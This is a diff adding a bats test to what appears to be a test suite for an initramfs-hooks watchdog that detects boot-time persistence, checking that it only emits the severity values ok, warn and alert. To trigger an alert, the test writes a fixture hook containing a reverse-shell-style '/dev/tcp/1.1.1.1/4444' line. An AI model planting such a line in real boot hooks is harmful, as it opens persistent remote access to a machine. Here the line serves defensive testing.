@@ -321,3 +321,26 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on initramfs surface)" {
+    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs
+    # (shell-init-watchdog, friction-audit, etc.). The
+    # initramfs-hooks-watchdog MUST only emit severity values
+    # from the closed set {ok,warn,alert} — never custom values
+    # (critical, error, fatal, notice, info). Operator
+    # dashboard parsers (alertmanager / log aggregator routes)
+    # branch on the literal severity string; an out-of-set
+    # value silently falls through routing and the operator
+    # never sees the T1542 Pre-OS Boot persistence alert.
+    # Locks parser contract on the early-boot-root-exec
+    # detection surface.
+    seed_benign
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # ok path
+    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/x-rev-shell"
+    chmod 0755 "${HOOKD}/x-rev-shell"
+    run_wd                                              # alert path
+    # Every severity value emitted MUST be one of {ok,warn,alert}.
+    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
+    [ -z "${bad}" ]
+}
